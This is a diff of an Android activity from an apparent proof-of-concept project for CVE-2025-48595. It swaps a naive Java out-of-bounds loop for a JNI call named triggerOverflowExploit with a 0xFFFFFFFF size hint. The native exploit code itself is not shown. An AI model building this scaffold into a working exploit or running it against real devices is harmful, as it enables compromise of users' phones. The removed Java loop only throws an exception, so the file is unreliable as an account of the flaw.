@@ -8,41 +8,25 @@ import android.widget.Toast;
 public class MainActivity extends Activity {
     private static final String TAG = "CVE-2025-48595";
 
-    // ВАЖНО: Имя должно совпадать с project("android_poc") в CMakeLists.txt!
+    // Загружаем библиотеку android_poc (совпадает с project name в CMake)
     static {
         System.loadLibrary("android_poc");
     }
 
-    public native String stringFromJNI();
+    // Единственный нативный метод, который нам нужен сейчас
+    public native String triggerOverflowExploit(int sizeHint);
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // 1. Вызываем C++ код
-        String cppResult = stringFromJNI();
-        Log.i(TAG, "Результат из C++: " + cppResult);
-        Toast.makeText(this, "C++ ответил: " + cppResult, Toast.LENGTH_LONG).show();
+        Log.i(TAG, "=== APP STARTED ===");
 
-        // 2. Вызываем Java код с переполнением
-        triggerIntegerOverflow();
-    }
+        // Вызываем C++ код с переполнением
+        // Передаем 0xFFFFFFFF как подсказку размера (хотя внутри оно само посчитает)
+        String result = triggerOverflowExploit(0xFFFFFFFF);
 
-    private void triggerIntegerOverflow() {
-        try {
-            Log.i(TAG, "Начинаем Java эксплойт...");
-
-            int maliciousValue = Integer.MAX_VALUE;
-            int[] buffer = new int[1024];
-
-            for (int i = 0; i < maliciousValue; i++) {
-                buffer[i] = i;
-            }
-
-        } catch (Exception e) {
-            Log.e(TAG, "ПОЙМАЛИ ИСКЛЮЧЕНИЕ: " + e.toString());
-            e.printStackTrace(); // Печатает весь стектрейс красным цветом
-            Toast.makeText(this, "Java упала: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-        }
+        Log.i(TAG, "Результат из C++: " + result);
+        Toast.makeText(this, "Exploit Result: " + result, Toast.LENGTH_LONG).show();
     }
 }
